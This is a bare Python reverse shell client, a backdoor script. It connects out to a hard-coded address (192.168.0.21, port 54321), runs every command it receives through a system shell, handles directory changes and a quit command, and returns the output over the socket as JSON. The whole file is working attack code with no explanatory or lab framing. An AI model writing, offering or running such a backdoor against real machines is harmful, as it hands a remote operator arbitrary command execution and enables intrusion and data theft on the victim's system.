#!/usr/bin/python

import socket
import subprocess
import json
import os


def relibale_send(data):
	json_data = json.dumps(data.decode('utf-8'))
	sock.send(bytes(json_data, 'utf-8'))

def reliable_recv():
	data = ""
	while True:
		try :
			data = data + str(sock.recv(1024).decode("utf-8"))
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				relibale_send(result)
			except Exception as e:
				print(e)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.0.21", 54321))
shell()
sock.close()


